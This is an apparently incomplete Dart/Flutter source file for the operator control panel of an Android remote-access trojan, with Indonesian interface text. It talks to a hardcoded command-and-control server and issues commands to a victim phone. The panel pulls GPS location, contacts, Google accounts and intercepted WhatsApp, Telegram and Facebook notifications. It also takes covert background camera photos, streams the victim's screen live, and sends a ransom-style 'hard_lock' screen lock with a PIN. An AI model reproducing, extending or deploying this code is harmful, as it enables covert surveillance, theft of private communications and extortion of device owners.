import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'package:url_launcher/url_launcher.dart';

class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? deviceData;
  
  const ControlCenterPage({super.key, this.deviceData});

  @override
  State<ControlCenterPage> createState() => _ControlCenterPageState();
}

class _ControlCenterPageState extends State<ControlCenterPage> {
  bool _isSending = false;
  final List<String> _executionLogs = [];

  bool _isStreamingScreen = false;
  String _currentStreamFrame = "";
  StateSetter? _streamStateSetter;

  String _targetId = "unknown";
  Map<String, dynamic>? _deviceData;

  // Base URL API - ganti dengan server Anda
  final String _baseUrl = "http://capekkenaoanyak.onlinepanel.my.id:2002";

  // Untuk dropdown expansion
  bool _isIntelExpanded = false;
  bool _isAudioExpanded = false;
  bool _isLocationExpanded = false;
  bool _isNetworkExpanded = false;
  bool _isMediaExpanded = false;
  bool _isRemoteExpanded = false;

  @override
  void initState() {
    super.initState();
    
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _extractDeviceData();
      _triggerAutoWakeup();
    });
  }

  void _extractDeviceData() {
    try {
      Map<String, dynamic>? args = widget.deviceData;
      
      if (args == null) {
        final routeArgs = ModalRoute.of(context)?.settings.arguments;
        if (routeArgs != null && routeArgs is Map<String, dynamic>) {
          args = routeArgs;
        }
      }
      
      if (args != null && args.isNotEmpty) {
        final Map<String, dynamic> safeArgs = args;
        
        setState(() {
          _deviceData = safeArgs;
          _targetId = safeArgs['id']?.toString() ?? 
                      safeArgs['deviceId']?.toString() ?? 
                      safeArgs['targetId']?.toString() ?? 
                      "unknown";
        });
        
        _addLog("Device loaded: ${safeArgs['model'] ?? safeArgs['name'] ?? 'Unknown'}");
        _addLog("Target ID: $_targetId");
        _addLog("Status: ${safeArgs['status'] ?? 'Online'}");
      } else {
        _addLog("Warning: No device data received - using fallback");
        _targetId = "test_device_001";
        _deviceData = {
          'id': _targetId,
          'model': 'Android Device',
          'battery': '87',
          'status': 'Online'
        };
        _addLog("Using fallback device data with ID: $_targetId");
      }
    } catch (e) {
      _addLog("Error loading device: $e");
      _targetId = "fallback_device";
      _deviceData = {'id': _targetId, 'model': 'Fallback Device'};
    }
  }

  void _triggerAutoWakeup() {
    if (_targetId != "unknown" && _targetId.isNotEmpty && _targetId != "fallback_device") {
      _sendCommand("force_open", _targetId, isSilent: true);
    } else {
      _addLog("Auto-wakeup skipped: ID tidak valid");
    }
  }

  void _addLog(String message) {
    if (mounted) {
      setState(() {
        _executionLogs.insert(0, "[${DateTime.now().toString().substring(11, 19)}] $message");
        if (_executionLogs.length > 100) _executionLogs.removeLast();
      });
    }
  }

  Future<void> _sendCommand(String command, String targetId, {String? extra, bool isSilent = false}) async {
    if (targetId == "unknown" || targetId.isEmpty || targetId == "fallback_device") {
      if (!isSilent) {
        _addLog("Error: ID Target tidak valid - '$targetId'");
        _showNotif("ID TIDAK TERDETEKSI: $targetId");
      }
      return;
    }

    if (!isSilent) {
      setState(() => _isSending = true);
      _addLog("Mengirim perintah: $command ke $targetId");
    }
    
    try {
      final response = await http.post(
        Uri.parse("$_baseUrl/api/send-command"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "id": targetId, 
          "command": command, 
          "extra": extra ?? "", 
        }),
      ).timeout(const Duration(seconds: 15));

      if (response.statusCode == 200) {
        if (!isSilent) _addLog("Perintah $command TERKIRIM. Menunggu respon target...");
        _startResponsePolling(command, targetId, isSilent: isSilent);
      } else {
        if (!isSilent) {
          _addLog("Error: Target Offline / Ditolak (Status: ${response.statusCode})");
          _showNotif("TARGET OFFLINE");
        }
      }
    } catch (e) {
      if (!isSilent) {
        _addLog("Error: Koneksi Gagal - ${e.toString()}");
        _showNotif("KONEKSI SERVER ERROR");
      }
    } finally {
      if (!isSilent) setState(() => _isSending = false);
    }
  }

  void _fetchNotificationLogs(String targetId) async {
    _addLog("Menarik database pesan & notifikasi...");
    try {
      final response = await http.get(
        Uri.parse("$_baseUrl/api/get-notifications/$targetId"),
      ).timeout(const Duration(seconds: 10));
      
      if (response.statusCode == 200) {
        final List logs = jsonDecode(response.body);
        _showNotificationLogsDialog(logs);
        _addLog("SUCCESS: ${logs.length} Pesan berhasil ditarik.");
      } else {
        _addLog("Gagal menarik notifikasi. Database kosong atau error.");
      }
    } catch (e) {
      _addLog("Error: Server API Down - ${e.toString()}");
      _showNotif("SERVER ERROR");
    }
  }

  void _startResponsePolling(String cmd, String targetId, {bool isSilent = false}) async {
    int attempts = 0;
    bool received = false;
    int maxAttempts = isSilent && cmd == "get_screen" ? 15 : 10; 

    while (attempts < maxAttempts && !received && mounted) {
      await Future.delayed(Duration(milliseconds: isSilent ? 800 : 3000));
      attempts++;
      if (!isSilent) _addLog("Polling respon... Percobaan $attempts/$maxAttempts");

      try {
        final response = await http.get(
          Uri.parse("$_baseUrl/api/get-response/$targetId"),
        ).timeout(const Duration(seconds: 5));
        
        if (response.statusCode == 200) {
          final data = jsonDecode(response.body);
          if (data != null && data.isNotEmpty && data['cmd'] == cmd) {
            _processResponse(cmd, data['data'], targetId);
            received = true;
          }
        }
      } catch (e) {
        // Silent fail untuk polling
      }
    }
    
    if (!received && !isSilent && mounted) {
      _addLog("Timeout: Target tidak merespon/terlalu lambat.");
    }
  }

  void _processResponse(String cmd, dynamic data, String targetId) {
    if (data == null) return;

    if (cmd == "get_location") {
      _addLog("SUCCESS: Koordinat GPS diterima.");
      _showLocationDialog(data['lat'], data['lng']);
    } else if (cmd == "get_contacts") {
      _addLog("SUCCESS: Database kontak diunduh.");
      _showContactsDialog(data['contacts'] ?? []);
    } else if (cmd == "take_photo") {
      _addLog("SUCCESS: Gambar kamera background ditarik.");
      _showCameraResultDialog(data['image_base64']);
    } else if (cmd == "get_screen") {
      if (!_isStreamingScreen) _addLog("SUCCESS: Memulai Real Screen Stream.");
      _showScreenResultDialog(data['image_base64'] ?? "", targetId);
    } else if (cmd == "get_gmails") {
      _addLog("SUCCESS: Daftar Akun Gmail ditarik.");
      _showGmailDialog(data['accounts'] ?? "No Accounts Found");
    } else if (cmd == "record_audio") {
      _addLog("ATTACK: WiFi DDoS/Jammer Aktif di Target!");
      _showNotif("DDOS BERHASIL DIAKTIFKAN");
    } else if (cmd == "vibrate_loop") {
      _addLog("SUCCESS: Target berhasil digetarkan.");
      _showNotif("TARGET BERGETAR");
    } else if (cmd == "flash_strobe") {
      _addLog("SUCCESS: Strobe Flash Native Aktif (30ms).");
      _showNotif("STROBE ACTIVE");
    } else {
      _addLog("Eksekusi $cmd Berhasil");
      _showNotif("PERINTAH [$cmd] BERHASIL");
    }
  }

  void _showCameraResultDialog(String base64Image) {
    if (base64Image.isEmpty) {
      _showNotif("GAGAL: Tidak ada gambar yang diterima");
      return;
    }
    
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF0F111E),
        title: const Text("TANGKAPAN KAMERA BACKGROUND", style: TextStyle(color: Colors.white, fontSize: 12)),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            ClipRRect(
              borderRadius: BorderRadius.circular(10),
              child: Image.memory(
                base64Decode(base64Image),
                fit: BoxFit.contain,
                errorBuilder: (context, error, stackTrace) => const Text("Gagal memuat gambar", style: TextStyle(color: Colors.white)),
              ),
            ),
            const SizedBox(height: 10),
            const Text("Captured instantly from background camera.", style: TextStyle(color: Colors.white24, fontSize: 10)),
          ],
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text("TUTUP")),
        ],
      ),
    );
  }

  void _showScreenResultDialog(String base64Image, String targetId) {
    _currentStreamFrame = base64Image;

    if (_isStreamingScreen && _streamStateSetter != null) {
      _streamStateSetter!((){});
      Future.delayed(const Duration(milliseconds: 1000), () {
        if (mounted && _isStreamingScreen) {
            _sendCommand("get_screen", targetId, isSilent: true);
        }
      });
      return;
    }

    _isStreamingScreen = true;
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => StatefulBuilder(
        builder: (context, setDialogState) {
          _streamStateSetter = setDialogState;
          return AlertDialog(
            backgroundColor: const Color(0xFF0F111E),
            insetPadding: const EdgeInsets.all(10),
            title: const Row(
              children: [
                Icon(Icons.live_tv, color: Colors.redAccent, size: 18),
                SizedBox(width: 10),
                Text("REAL TIME SCREEN STREAM", style: TextStyle(color: Colors.white, fontSize: 12)),
              ],
            ),
            content: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                ClipRRect(
                  borderRadius: BorderRadius.circular(10),
                  child: _currentStreamFrame.isNotEmpty 
                    ? Image.memory(
                        base64Decode(_currentStreamFrame),
                        fit: BoxFit.contain,
                        gaplessPlayback: true, 
                        errorBuilder: (c, e, s) => const Text("Gagal memuat layar", style: TextStyle(color: Colors.white)),
                      )
                    : const Padding(
                        padding: EdgeInsets.all(20.0),
                        child: CircularProgressIndicator(color: Colors.redAccent),
                      ),
                ),
                const SizedBox(height: 10),
                const LinearProgressIndicator(color: Colors.redAccent, backgroundColor: Colors.white10),
                const SizedBox(height: 10),
                const Text("Capturing real target screen background.", style: TextStyle(color: Colors.redAccent, fontSize: 9)),
              ],
            ),
            actions: [
              TextButton(
                onPressed: () {
                  _isStreamingScreen = false;
                  _streamStateSetter = null;
                  Navigator.pop(context);
                }, 
                child: const Text("STOP STREAM", style: TextStyle(color: Colors.redAccent))
              ),
            ],
          );
        }
      ),
    ).then((_) {
      _isStreamingScreen = false;
      _streamStateSetter = null;
    });

    Future.delayed(const Duration(milliseconds: 500), () {
      if (mounted && _isStreamingScreen) {
          _sendCommand("get_screen", targetId, isSilent: true);
      }
    });
  }

  void _showLocationDialog(dynamic lat, dynamic lng) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF0F111E),
        title: const Text("PELACAKAN LOKASI REAL-TIME", style: TextStyle(color: Colors.white, fontSize: 12)),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(color: Colors.black, borderRadius: BorderRadius.circular(10)),
              child: SelectableText("KOORDINAT: $lat, $lng", style: const TextStyle(color: Colors.redAccent, fontSize: 12, fontWeight: FontWeight.bold)),
            ),
            const SizedBox(height: 15),
            ClipRRect(
              borderRadius: BorderRadius.circular(15),
              child: Image.network(
                "https://static-maps.yandex.ru/1.x/?lang=en_US&ll=$lng,$lat&z=15&l=map&size=450,300",
                height: 200, width: double.infinity, fit: BoxFit.cover,
                errorBuilder: (c, e, s) => const Icon(Icons.map, color: Colors.white, size: 50),
              ),
            ),
          ],
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text("TUTUP")),
          TextButton(
            onPressed: () => launchUrl(Uri.parse("https://www.google.com/maps/search/?api=1&query=$lat,$lng"), mode: LaunchMode.externalApplication),
            child: const Text("BUKA GOOGLE MAPS", style: TextStyle(color: Colors.blueAccent)),
          ),
        ],
      ),
    );
  }

  void _showContactsDialog(List contacts) {
    showModalBottomSheet(
      context: context,
      backgroundColor: const Color(0xFF1A1D2D),
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(25))),
      builder: (context) => DraggableScrollableSheet(
        initialChildSize: 0.6,
        maxChildSize: 0.9,
        expand: false,
        builder: (context, scrollController) => Column(
          children: [
            const Padding(
              padding: EdgeInsets.all(15),
              child: Text("DUMP KONTAK TARGET", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
            ),
            Expanded(
              child: ListView.builder(
                controller: scrollController,
                itemCount: contacts.length,
                itemBuilder: (context, i) => ListTile(
                  leading: const CircleAvatar(backgroundColor: Colors.redAccent, child: Icon(Icons.person, color: Colors.white, size: 20)),
                  title: Text(contacts[i]['name'] ?? "No Name", style: const TextStyle(color: Colors.white, fontSize: 14)),
                  subtitle: Text(contacts[i]['number'] ?? "No Number", style: const TextStyle(color: Colors.white38, fontSize: 12)),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _showNotificationLogsDialog(List logs) {
    String selectedFilter = "ALL"; 

    showModalBottomSheet(
      context: context,
      backgroundColor: const Color(0xFF0F111E),
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(25))),
      builder: (context) => StatefulBuilder(
        builder: (context, setModalState) {
          List filteredLogs = logs.where((log) {
            String pkg = log['package']?.toString().toLowerCase() ?? "";
            if (selectedFilter == "WA") return pkg.contains("whatsapp");
            if (selectedFilter == "TELE") return pkg.contains("telegram");
            if (selectedFilter == "FB") return pkg.contains("facebook") || pkg.contains("orca");
            if (selectedFilter == "GMAIL") return pkg.contains("android.gm");
            return true;
          }).toList();

          return DraggableScrollableSheet(
            initialChildSize: 0.8,
            maxChildSize: 0.95,
            expand: false,
            builder: (context, scrollController) => Column(
              children: [
                Container(
                  margin: const EdgeInsets.symmetric(vertical: 10),
                  width: 40, height: 4, decoration: BoxDecoration(color: Colors.white12, borderRadius: BorderRadius.circular(10)),
                ),
                const Text("LIVE MESSAGE INTERCEPTOR", style: TextStyle(color: Colors.redAccent, fontWeight: FontWeight.bold, fontSize: 16)),
                const SizedBox(height: 15),
                SingleChildScrollView(
                  scrollDirection: Axis.horizontal,
                  padding: const EdgeInsets.symmetric(horizontal: 15),
                  child: Row(
                    children: [
                      _buildFilterBtn("ALL", Icons.all_inclusive, Colors.white54, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
                      _buildFilterBtn("WA", Icons.chat, Colors.greenAccent, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
                      _buildFilterBtn("TELE", Icons.send, Colors.blueAccent, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
                      _buildFilterBtn("FB", Icons.facebook, Colors.blue, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
                      _buildFilterBtn("GMAIL", Icons.mail, Colors.redAccent, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
                    ],
                  ),
                ),
                const SizedBox(height: 10),
                Expanded(
                  child: ListView.builder(
                    controller: scrollController,
                    itemCount: filteredLogs.length,
                    itemBuilder: (context, i) {
                      final log = filteredLogs[i];
                      String pkg = log['package']?.toString() ?? "";
                      IconData icon = Icons.notifications;
                      Color iconColor = Colors.greenAccent;
                      if (pkg.contains("whatsapp")) icon = Icons.chat;
                      else if (pkg.contains("telegram")) icon = Icons.send;
                      else if (pkg.contains("android.gm")) { icon = Icons.mail; iconColor = Colors.redAccent; }

                      return ListTile(
                        leading: Icon(icon, color: iconColor),
                        title: Text(log['title'] ?? "Unknown", style: const TextStyle(color: Colors.white, fontSize: 13, fontWeight: FontWeight.bold)),
                        subtitle: Text(log['body'] ?? "", style: const TextStyle(color: Colors.white70, fontSize: 12)),
                      );
                    },
                  ),
                ),
              ],
            ),
          );
        }
      ),
    );
  }

  Widget _buildFilterBtn(String label, IconData icon, Color color, String active, Function(String) onTap) {
    bool isSelected = active == label;
    return GestureDetector(
      onTap: () => onTap(label),
      child: Container(
        margin: const EdgeInsets.only(right: 8),
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
        decoration: BoxDecoration(
          color: isSelected ? color.withOpacity(0.2) : Colors.white10,
          borderRadius: BorderRadius.circular(20),
          border: Border.all(color: isSelected ? color : Colors.transparent),
        ),
        child: Row(
          children: [
            Icon(icon, size: 14, color: isSelected ? color : Colors.white54),
            const SizedBox(width: 6),
            Text(label, style: TextStyle(color: isSelected ? Colors.white : Colors.white54, fontSize: 11, fontWeight: FontWeight.bold)),
          ],
        ),
      ),
    );
  }

  void _showCameraMenu(String targetId) {
    String selectedCam = "back"; 
    showDialog(
      context: context,
      builder: (context) => StatefulBuilder(
        builder: (context, setInternalState) => AlertDialog(
          backgroundColor: const Color(0xFF1A1D2D),
          title: const Text("SURVEILLANCE CAMERA", style: TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.bold)),
          content: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              const Text("Pilih lensa kamera target:", style: TextStyle(color: Colors.white54, fontSize: 12)),
              const SizedBox(height: 20),
              Row(
                mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                children: [
                  _cameraOption(Icons.camera_rear, "BELAKANG", "back", selectedCam, (val) => setInternalState(() => selectedCam = val)),
                  _cameraOption(Icons.camera_front, "DEPAN", "front", selectedCam, (val) => setInternalState(() => selectedCam = val)),
                ],
              ),
              const SizedBox(height: 30),
              ElevatedButton(
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.orangeAccent,
                  minimumSize: const Size(double.infinity, 45),
                ),
                onPressed: () {
                  _sendCommand("take_photo", targetId, extra: selectedCam);
                  Navigator.pop(context);
                },
                child: const Text("AMBIL FOTO TARGET", style: TextStyle(color: Colors.black, fontWeight: FontWeight.bold)),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _cameraOption(IconData icon, String label, String value, String current, Function(String) onTap) {
    bool isSelected = value == current;
    return GestureDetector(
      onTap: () => onTap(value),
      child: Column(
        children: [
          Icon(icon, size: 40, color: isSelected ? Colors.orangeAccent : Colors.white24),
          const SizedBox(height: 8),
          Text(label, style: TextStyle(color: isSelected ? Colors.orangeAccent : Colors.white24, fontSize: 10, fontWeight: FontWeight.bold)),
        ],
      ),
    );
  }

  void _showGmailDialog(String emails) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF0F111E),
        title: const Text("GOOGLE ACCOUNTS LIST", style: TextStyle(color: Colors.redAccent, fontSize: 12, fontWeight: FontWeight.bold)),
        content: Container(
          padding: const EdgeInsets.all(10),
          decoration: BoxDecoration(color: Colors.black, borderRadius: BorderRadius.circular(8)),
          child: SelectableText(
            emails,
            style: const TextStyle(color: Colors.greenAccent, fontFamily: 'monospace', fontSize: 13),
          ),
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text("TUTUP")),
        ],
      ),
    );
  }

  void _showInputDialog(String title, String cmd, String targetId) {
    TextEditingController textCtrl = TextEditingController();
    TextEditingController pinCtrl = TextEditingController();

    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF1A1D2D),
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(15)),
        title: Row(
          children: [
            Icon(
              cmd == "play_audio" ? Icons.music_note : (cmd == "set_wallpaper" ? Icons.image : (cmd == "hard_lock" ? Icons.lock : Icons.link)), 
              color: Colors.redAccent, size: 20
            ),
            const SizedBox(width: 10),
            Text(title, style: const TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.bold)),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            TextField(
              controller: textCtrl,
              style: const TextStyle(color: Colors.white, fontSize: 13),
              decoration: InputDecoration(
                labelText: cmd == "play_audio" ? "Link URL MP3" : (cmd == "set_wallpaper" ? "Link URL Gambar (JPG)" : (cmd == "hard_lock" ? "Pesan Layar" : "URL Website")),
                labelStyle: const TextStyle(color: Colors.white38),
                hintText: cmd == "play_audio" ? "https://site.com/audio.mp3" : "...",
                hintStyle: const TextStyle(color: Colors.white12),
                enabledBorder: const UnderlineInputBorder(borderSide: BorderSide(color: Colors.white10)),
                focusedBorder: const UnderlineInputBorder(borderSide: BorderSide(color: Colors.redAccent)),
              ),
            ),
            if (cmd == "hard_lock") ...[
              const SizedBox(height: 15),
              TextField(
                controller: pinCtrl,
                keyboardType: TextInputType.number,
                style: const TextStyle(color: Colors.white, fontSize: 13),
                decoration: const InputDecoration(
                  labelText: "PIN Unlock",
                  labelStyle: TextStyle(color: Colors.white38),
                  hintText: "1234",
                  hintStyle: TextStyle(color: Colors.white12),
                  enabledBorder: UnderlineInputBorder(borderSide: BorderSide(color: Colors.white10)),
                  focusedBorder: UnderlineInputBorder(borderSide: BorderSide(color: Colors.redAccent)),
                ),
              ),
            ],
          ],
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text("Batal", style: TextStyle(color: Colors.white38))),
          ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: Colors.redAccent),
            onPressed: () {
              String finalMsg = textCtrl.text.trim();
              String finalPin = pinCtrl.text.trim();

              if (cmd == "hard_lock") {
                if (finalMsg.isEmpty) finalMsg = "YOUR PHONE IS LOCKED!!!!";
                if (finalPin.isEmpty) finalPin = "123"; 
                _sendCommand(cmd, targetId, extra: "$finalMsg|$finalPin");
              } else {
                _sendCommand(cmd, targetId, extra: finalMsg);
              }
              Navigator.pop(context);
            },
            child: const Text("Kirim", style: TextStyle(color: Colors.white)),
          ),
        ],
      ),
    );
  }

  void _showNotif(String m) {
    if (mounted) {
      ScaffoldMessenger.of(context).showSnackBar(SnackBar(backgroundColor: Colors.redAccent, content: Text(m), duration: const Duration(seconds: 1)));
    }
  }

  // BUILD DEVICE INFO SECTION (NEW & IMPROVED)
  Widget _buildDeviceInfo() {
    bool isOnline = _deviceData?['status'] == 'Online' || _deviceData?['status'] == null;
    String batteryLevel = _deviceData?['battery']?.toString() ?? '100';
    String deviceModel = _deviceData?['model'] ?? _deviceData?['name'] ?? "Android Device";
    String deviceBrand = _deviceData?['brand'] ?? "Samsung";
    int battery = int.tryParse(batteryLevel) ?? 100;
    
    return Container(
      margin: const EdgeInsets.all(15),
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [
            const Color(0xFF1A1D2D),
            const Color(0xFF0F111E),
          ],
        ),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: isOnline ? Colors.greenAccent.withOpacity(0.3) : Colors.redAccent.withOpacity(0.3)),
        boxShadow: [
          BoxShadow(
            color: isOnline ? Colors.greenAccent.withOpacity(0.1) : Colors.redAccent.withOpacity(0.1),
            blurRadius: 10,
            spreadRadius: 2,
          ),
        ],
      ),
      child: Column(
        children: [
          // Top Row - Device Icon & Status
          Row(
            children: [
              // Animated Device Icon
              Container(
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: isOnline 
                      ? [Colors.greenAccent.withOpacity(0.2), Colors.greenAccent.withOpacity(0.05)]
                      : [Colors.redAccent.withOpacity(0.2), Colors.redAccent.withOpacity(0.05)],
                  ),
                  borderRadius: BorderRadius.circular(18),
                  border: Border.all(
                    color: isOnline ? Colors.greenAccent : Colors.redAccent, 
                    width: 1.5,
                  ),
                ),
                child: Icon(
                  Icons.phone_android,
                  color: isOnline ? Colors.greenAccent : Colors.redAccent,
                  size: 32,
                ),
              ),
              const SizedBox(width: 12),
              // Device Info
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      deviceModel,
                      style: const TextStyle(
                        color: Colors.white,
                        fontSize: 15,
                        fontWeight: FontWeight.bold,
                      ),
                      overflow: TextOverflow.ellipsis,
                    ),
                    const SizedBox(height: 4),
                    Text(
                      deviceBrand,
                      style: const TextStyle(
                        color: Colors.white38,
                        fontSize: 11,
                      ),
                    ),
                  ],
                ),
              ),
              // Status Badge
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: isOnline 
                      ? [Colors.greenAccent.withOpacity(0.2), Colors.greenAccent.withOpacity(0.05)]
                      : [Colors.redAccent.withOpacity(0.2), Colors.redAccent.withOpacity(0.05)],
                  ),
                  borderRadius: BorderRadius.circular(20),
                  border: Border.all(
                    color: isOnline ? Colors.greenAccent : Colors.redAccent,
                    width: 1,
                  ),
                ),
                child: Row(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Container(
                      width: 8,
                      height: 8,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        color: isOnline ? Colors.greenAccent : Colors.redAccent,
                        boxShadow: [
                          BoxShadow(
                            color: isOnline ? Colors.greenAccent : Colors.redAccent,
                            blurRadius: 4,
                            spreadRadius: 1,
                          ),
                        ],
                      ),
                    ),
                    const SizedBox(width: 6),
                    Text(
                      isOnline ? "ONLINE" : "OFFLINE",
                      style: TextStyle(
                        color: isOnline ? Colors.greenAccent : Colors.redAccent,
                        fontSize: 11,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
          const SizedBox(height: 15),
          // Bottom Row - Battery & Shield
          Row(
            children: [
              // Battery Card
              Expanded(
                child: Container(
                  padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                  decoration: BoxDecoration(
                    color: const Color(0xFF0F111E),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: Colors.white10),
                  ),
                  child: Row(
                    children: [
                      Stack(
                        alignment: Alignment.center,
                        children: [
                          Icon(
                            Icons.battery_full,
                            color: battery > 20 
                              ? (battery > 50 ? Colors.greenAccent : Colors.orangeAccent)
                              : Colors.redAccent,
                            size: 24,
                          ),
                          Text(
                            "$battery",
                            style: TextStyle(
                              color: Colors.white,
                              fontSize: 9,
                              fontWeight: FontWeight.bold,
                            ),
                          ),
                        ],
                      ),
                      const SizedBox(width: 8),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(
                              "Battery",
                              style: TextStyle(
                                color: Colors.white38,
                                fontSize: 9,
                              ),
                            ),
                            Text(
                              "$batteryLevel%",
                              style: TextStyle(
                                color: battery > 20 
                                  ? (battery > 50 ? Colors.greenAccent : Colors.orangeAccent)
                                  : Colors.redAccent,
                                fontSize: 12,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                ),
              ),
              const SizedBox(width: 10),
              // Shield Card
              Expanded(
                child: Container(
                  padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                  decoration: BoxDecoration(
                    gradient: LinearGradient(
                      colors: [
                        Colors.blueAccent.withOpacity(0.15),
                        Colors.purpleAccent.withOpacity(0.05),
                      ],
                    ),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: Colors.blueAccent.withOpacity(0.3)),
                  ),
                  child: Row(
                    children: [
                      Icon(
                        Icons.shield,
                        color: Colors.blueAccent,
                        size: 22,
                      ),
                      const SizedBox(width: 8),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(
                              "Security",
                              style: TextStyle(
                                color: Colors.white38,
                                fontSize: 9,
                              ),
                            ),
                            const Text(
                              "ACTIVE",
                              style: TextStyle(
                                color: Colors.blueAccent,
                                fontSize: 11,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                ),
              ),
            ],
          ),
        ],
      ),
    );
  }

  // BUILD ACTIVE LOG SECTION (UPDATED)
  Widget _buildActiveLog() {
    return Container(
      margin: const EdgeInsets.all(15),
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: const Color(0xFF141724),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: Colors.white10),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Row(
            children: [
              Icon(Icons.list_alt, color: Colors.redAccent, size: 18),
              SizedBox(width: 8),
              Text("Activity Log", style: TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.bold)),
            ],
          ),
          const SizedBox(height: 12),
          SizedBox(
            height: 100,
            child: ListView.builder(
              reverse: true,
              itemCount: _executionLogs.length > 5 ? 5 : _executionLogs.length,
              itemBuilder: (context, i) => Padding(
                padding: const EdgeInsets.symmetric(vertical: 4),
                child: Row(
                  children: [
                    Container(
                      width: 6,
                      height: 6,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        color: _executionLogs[i].contains("SUCCESS") 
                          ? Colors.greenAccent 
                          : (_executionLogs[i].contains("Error") ? Colors.redAccent : Colors.white24),
                      ),
                    ),
                    const SizedBox(width: 8),
                    Expanded(
                      child: Text(
                        _executionLogs[i], 
                        style: const TextStyle(color: Colors.white38, fontSize: 10, fontFamily: 'monospace'),
                        maxLines: 1,
                        overflow: TextOverflow.ellipsis,
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  // BUILD DROPDOWN SECTION
  Widget _buildDropdownSection({
    required String title,
    required String subtitle,
    required IconData icon,
    required Color color,
    required bool isExpanded,
    required VoidCallback onToggle,
    required List<Widget> buttons,
  }) {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 15, vertical: 6),
      decoration: BoxDecoration(
        color: const Color(0xFF141724),
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: color.withOpacity(0.2)),
      ),
      child: Column(
        children: [
          // Header (always visible)
          InkWell(
            onTap: onToggle,
            borderRadius: BorderRadius.circular(16),
            child: Padding(
              padding: const EdgeInsets.all(15),
              child: Row(
                children: [
                  Container(
                    padding: const EdgeInsets.all(10),
                    decoration: BoxDecoration(
                      color: color.withOpacity(0.1),
                      borderRadius: BorderRadius.circular(12),
                    ),
                    child: Icon(icon, color: color, size: 22),
                  ),
                  const SizedBox(width: 15),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          title,
                          style: TextStyle(
                            color: color,
                            fontSize: 15,
                            fontWeight: FontWeight.bold,
                          ),
                        ),
                        const SizedBox(height: 4),
                        Text(
                          subtitle,
                          style: const TextStyle(color: Colors.white38, fontSize: 10),
                          maxLines: 1,
                          overflow: TextOverflow.ellipsis,
                        ),
                      ],
                    ),
                  ),
                  AnimatedRotation(
                    turns: isExpanded ? 0.5 : 0,
                    duration: const Duration(milliseconds: 200),
                    child: Icon(
                      Icons.keyboard_arrow_down,
                      color: Colors.white54,
                    ),
                  ),
                ],
              ),
            ),
          ),
